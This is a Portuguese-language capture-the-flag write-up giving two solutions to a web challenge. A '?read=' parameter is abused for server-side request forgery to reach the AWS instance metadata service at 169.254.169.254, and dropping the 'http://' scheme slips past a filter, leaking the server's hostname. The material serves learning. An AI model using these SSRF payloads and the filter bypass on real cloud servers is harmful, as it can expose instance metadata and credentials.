# Web5

## Resolução 1 [@GouveaHeitor](https://github.com/GouveaHeitor)

### Writeup

O desafio desde o início já apresentava algumas dicas que poderiam ajudar o Player a resolve-lo:

![Image](../img/web-5-chall.png)


Abrindo o desáfio, nos deparamos com o seguinte comportamento

![Image](../img/web-5-open.png)


A página em questão, possuia um parâmetro chamado de **?read=** que recebia uma página remota e a incluia dentro do da página anterior.

RAW URL: http://inmsec.xyz:9000/?read=https://insidersec.io/wp-includes/js/wp-embed.min.js

Esse tipo de comportamento nos leva a pensar em várias vulnerabilidades, como por exemplo XSS, Remote File Include e Server Side Request Forgery...

E de fato, a aplicação estava vulnerável a essas vulnerabilidades e talvez até a mais algumas outras... Mas lembrando o objetivo do desafio, precisavamos descobrir o hostname do servidor e no inicio do desafio existe uma pequena dica, o nome do mesmo: "Awesome Cloud Security" ou AWS.

Pra quem conhece um pouco sobre AWS, sabe que a mesma possuí uma instância fixa em todos seus serviços que é responsável por armazenar alguns metadados referentes aos serviços, e no caso essa instância só é acessível através do serviço original e uma das informações que ela armazena é justamente o hostname do servidor.

Essa instância é acessível através do IP: 169.154.169.254, sendo assim só era necessário tentar fazer uma requisição para essa página utilizando a aplicação vulneravel: http://inmsec.xyz:9000/?read=169.254.169.254

E o resultado foi:

![Image](../img/web-5-aws.png)

Dessa forma, só precisavamos encontrar o arquivo responsável por armazenar o hostname da instância e iriamos descobrir a nossa flag.
Que no fim seria: http://inmsec.xyz:9000/?read=169.254.169.254/latest/meta-data/hostname

## Resolução 2 [@notfounnd](https://github.com/notfounnd)
O desafio apresenta a seguinte descrição:

```
Awesome Cloud Security

Você consegue descobrir o hostname do servidor abaixo?

http://inmsec.xyz:9000/
```

### Writeup:

Ao acessar a página [http://inmsec.xyz:9000/](http://inmsec.xyz:9000/) somos redirecionados ao seguinte conteúdo.

```
URL: http://inmsec.xyz:9000/?read=https://insidersec.io/wp-includes/js/wp-embed.min.js

> !function(a,b){"use strict";function c(){if(!e){e=!0;var a,c,d,f,g=-1!==navigator.appVersion.indexOf("MSIE 10"),h=!!navigator.userAgent.match(/Trident.*rv:11\./),i=b.querySelectorAll("iframe.wp-embedded-content");for(c=0;c1e3)g=1e3;else if(~~g<200)g=200;f.height=g}if("link"===d.message)if(h=b.createElement("a"),i=b.createElement("a"),h.href=f.getAttribute("src"),i.href=d.value,i.host===h.host)if(b.activeElement===f)a.top.location.href=d.value}else;}},d)a.addEventListener("message",a.wp.receiveEmbedMessage,!1),b.addEventListener("DOMContentLoaded",c,!1),a.addEventListener("load",c,!1)}(window,document);
```

Para seguir com a resolução, precisamos fixar alguns conceitos.

O **primeiro** deles é entender o que está ocorrendo quando efetuamos à URL disponibilizada no desafio. Observando a composição final da URL que obtemos após o redirecionamento do link, podemos separá-lo em duas URL's distintas:

```
> http://inmsec.xyz:9000/?read=
> https://insidersec.io/wp-includes/js/wp-embed.min.js
```

Ao abrir de maneira apartada a URL [https://insidersec.io/wp-includes/js/wp-embed.min.js](https://insidersec.io/wp-includes/js/wp-embed.min.js) podemos verificar exatamente o mesmo conteúdo de texto apresentado após acessarmos URL [http://inmsec.xyz:9000/](http://inmsec.xyz:9000/).

Somando essa análise à URL final (pós-redirecionamento), podemos deduzir que através do link http://inmsec.xyz:9000/ somos direcionados ao uma leitura **?read=** do conteúdo disposto no link https://insidersec.io/wp-includes/js/wp-embed.min.js.

Podemos efetuar uma prova de conceito dessa observação compondo a URL final com direcionamento de leitura à outro arquivo qualquer. No exemplo seguinte utilizamos um arquivo disposto no [W3Schools](https://www.w3schools.com/).

```
URL: http://inmsec.xyz:9000/?read=https://www.w3schools.com/js/myScript.js

> function myFunction() { document.getElementById("demo").innerHTML="Paragraph changed."; }
```

O **segundo** conceito é entender do que se trata um 'hostname'. Ao efetuarmos uma pesquisa pelos termos 'o que é um hostname', conseguimos encontrar a seguinte definição [nesse artigo](https://king.host/wiki/artigo/ip-hostname/):

> **Hostname**
> 
> É o nome de uma máquina em uma rede.
> Essa máquina pode conter diversos hostnames virtuais que são gerenciados por um software, como o Apache e IIS (webservers).
> 
> Exemplo:
> www.meusiteweb.com.br (Resolve para o IP 189.38.70.50)

Ainda nesse mesmo artigo temos a seguinte informação:

> **Endereço IP**
> 
> O endereço IP é a identificação de um dispositivo em uma rede.
> Cada computador possui um endereço IP único, e através dele uma máquina se comunica com as demais na Internet.
> 
> Atualmente utilizamos duas versões deste protocolo:
> 
> **IPv4**
> 
> O mais utilizado atualmente, limitado a 4 bilhões de endereços válidos. Exemplos: _127.0.0.1_, _192.168.0.26_, _74.125.234.127_
>
> **IPv6**
> 
> Nova versão, possibilita 340 undecilhões de endereços válidos. Exemplo: _2001:0db8:85a3:08d3:1319:8a2e:0370:7344_

Com essas informações podemos deduzir que nossa busca terá como objetivo encontrar o _nome de uma máquina_ (nesse caso o do servidor) e que, por se tratar de um dispositivo em uma rede, _nosso host tem um IP_.

**Continuando nossa resolução**, ao pesquisar pelos termos 'descobrir host de um site' iremos conseguir chegar à ferramenta [Who is Hosting This](https://www.whoishostingthis.com/) através [desse artigo](https://www.tecmundo.com.br/internet/119428-descobrir-onde-site-hospedado.htm). Através da ferramenta podemos verificar os seguintes dados:

```
https://www.whoishostingthis.com/#search=inmsec.xyz

> Hosting Provider: Amazon.com
> IP Address: 3.92.237.231
```

Com esses dados, sabemos que a host do link que estamos analisando no desafio é a Amazon (famosa AWS). Ao pesquisamos por 'hostname aws', [um dos retornos](https://docs.aws.amazon.com/pt_br/AWSEC2/latest/WindowsGuide/using-instance-addressing.html) de nossa busca traz o seguinte conteúdo:

> **Endereçamento IP de instâncias do Amazon EC2**
>
> O Amazon EC2 e a Amazon VPC oferecem suporte aos protocolos de endereçamento IPv4 e IPv6. Por padrão, o Amazon EC2 e a Amazon VPC usam o protocolo de endereçamento IPv4. [...]
>
> **Tópicos**
>
> - Endereços IPv4 privados e nomes de host DNS internos
> 
> - Endereços IPv4 públicos e nomes de host DNS externos

Com esses dados podemos verificar que uma das características da arquitetura AWS é possuir hostnames privados/internos e públicos/externos.

Ao efetuar um scan com a ferramenta [Nmap](https://nmap.online/result/4c38c677b9f0983abe175b684b1471f903b90a97/inmsecxyz4) (mais informações sobre Nmap [aqui](https://github.com/notfounnd/ctf_writeups/blob/web/recon/recon2.md)), obtemos o seguinte registro:

```
> Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-23 07:43 PDT
> Nmap scan report for inmsec.xyz (3.92.237.231)
> Host is up (0.063s latency).
> rDNS record for 3.92.237.231: ec2-3-92-237-231.compute-1.amazonaws.com
```

**Tentativa Fail:** No registro obtido através da consulta Nmap obtemos o host público/externo 'ec2-3-92-237-231.compute-1.amazonaws.com' dessa instância na AWS, porém sem sucesso ao fazer submit no formulário do desafio. _(Valeu [Heitor](https://github.com/GouveaHeitor) por dificultar tanto nossa vida... Hahahah...)_

A partir do insucesso no envio dessa primeira tentativa, presumimos que a informação que estamos procurando é o host privado/interno. Com base nisso (depois de algumas várias buscas) conseguimos o [seguinte conteúdo](https://forums.aws.amazon.com/thread.jspa?threadID=34163) ao pesquisar por 'aws get internal ip':

> **Re: how to get internal ip for my instance**
> 
> [...]
>
> Easiest is to:
> curl http://169.254.169.254/latest/meta-data/local-ipv4
> 
> (or go to that url using any HTTP client from the machine)
> 
> curl http://169.254.169.254/latest/meta-data/public-ipv4 will give you your public IP

Com essas orientações conseguimos nortear uma pesquisa para entender do que se tratam as URL's no forum de dúvidas. Ao buscar por 'aws 169.154.169.254' podemos verificar as seguintes informações:

[What's special about 169.254.169.254 IP address for AWS?](https://stackoverflow.com/questions/42314029/whats-special-about-169-254-169-254-ip-address-for-aws)
> 169.254.169.254 is an IP address from the reserved IPv4 Link Local Address space 169.254.0.0/16 (169.254.0.0 through 169.254.255.255).
> 
> AWS needed to create a service endpoint accessible from any system and the selection of an address in this block causes it to conflict with no commonly used IP address space. Clever choice.

[What is this IP address: 169.254.169.254?](https://serverfault.com/questions/427018/what-is-this-ip-address-169-254-169-254)
> These are dynamically configured link-local addresses. They are only valid on a single network segment and are not to be routed.
> 
> Of particular note, 169.254.169.254 is used in Amazon EC2 and other cloud computing platforms to distribute metadata to cloud instances.

Amparado por essas informações, realizamos uma nova pesquisa pelos termos 'ipv4 link local address aws'. Para nossa surpresa voltamos à uma das páginas já consultadas dentro desse writeup, porém agora com um entendimento um pouco melhor do conteúdo.

Na página '[Endereçamento IP de instâncias do Amazon EC2](https://docs.aws.amazon.com/pt_br/AWSEC2/latest/WindowsGuide/using-instance-addressing.html)' podemos verificar as seguintes informções:

_Observação: CTRL+F não funciona aqui, precisa ler o conteúdo pra conseguir localizar a parte interessante (vlw AWS)_

> Para determinar os endereços IPv4 da instância usando os metadados
> 
> Conecte-se à sua instância. Para obter mais informações, consulte Conectar-se à instância do Windows.
> 
> Use o comando a seguir para acessar o endereço IP privado:
> 
> - PS C:\> Invoke-RestMethod http://169.254.169.254/latest/meta-data/local-ipv4
> 
> Use o comando a seguir para acessar o endereço IP público:
>
> - PS C:\> Invoke-RestMethod http://169.254.169.254/latest/meta-data/public-ipv4
>
> Observe que se um endereço IP elástico estiver associado à instância, o valor retornado será o do endereço IP elástico.

Com isso temos uma maneira de conseguir acessa as informações da EC no host AWS. Já vimos anteriormente que o IP '169.254.169.254' trata de um endereço local, ao tentar acessá-lo diretamente receberemos no navegador a informação que não é possível acessá-lo.

No entanto, podemos efetuar a leitura desse diretório através do host público do site. Para isso substituímos na URL final (pós-redirecionamento) o segundo link.

```
URL: http://inmsec.xyz:9000/?read=http://169.254.169.254/latest/meta-data/local-ipv4

> Sorry bro! You can do better than, man!
```

A mensagem 'Sorry bro! You can do better than, man!' é um indicador que conseguimos algum tipo de comunicação com o host. Ao reforçarmos o conceito do IP '169.254.169.254' ser um endereço interno, efetuamos uma tentativa sem o [protocolo HTTP](https://pt.wikipedia.org/wiki/Hypertext_Transfer_Protocol).

```
URL: http://inmsec.xyz:9000/?read=169.254.169.254/latest/meta-data/local-ipv4

> 192.168.1.235
```

Ao carregar a URL, temos nosso primeiro sinal de luz: o IP interno local do host.

Em uma [URL](https://pt.wikipedia.org/wiki/URL), sabemos que após o [DNS](https://pt.wikipedia.org/wiki/Sistema_de_Nomes_de_Dom%C3%ADnio) encontramos o caminho que especifica o local dos recursos que estamos acessando (como se fossem pastas). Com base nos conhecimentos que adquirimos, no acesso que efetuamos etamos efetuando a leitura do caminho '/latest/meta-data/local-ipv4' do endereço interno.

Subindo um nível na estrutura de arquivos, acessamos o caminho '/latest/meta-data'

```
URL: http://inmsec.xyz:9000/?read=169.254.169.254/latest/meta-data

> ami-id ami-launch-index ami-manifest-path block-device-mapping/ events/ hostname identity-credentials/ instance-action instance-id instance-type local-hostname local-ipv4 mac metrics/ network/ placement/ product-codes profile public-hostname public-ipv4 public-keys/ reservation-id security-groups services/
```

Ao carregar a URL, podemos verificar uma sério de outros diretórios e recursos disponíveis dentro do caminho '/latest/meta-data', entre eles '/hostname'.

**Tentativa Success:** Quando acessamos o caminho '/latest/meta-data/hostname' conseguimos verificar o nome de máquina (ou hostname) interno do nosso host.

```
URL http://inmsec.xyz:9000/?read=169.254.169.254/latest/meta-data/hostname

> Flag aparecerá aqui! :)
```

***Bônus:*** _Encontrei enquanto escrevia/revisava o writeup... [HowTo: Get Amazon EC2 Instance Metadata](http://www.dowdandassociates.com/blog/content/howto-get-amazon-ec2-instance-metadata/)_

---

[Voltar ao Menu Web](https://writeup.insidersec.io/web)
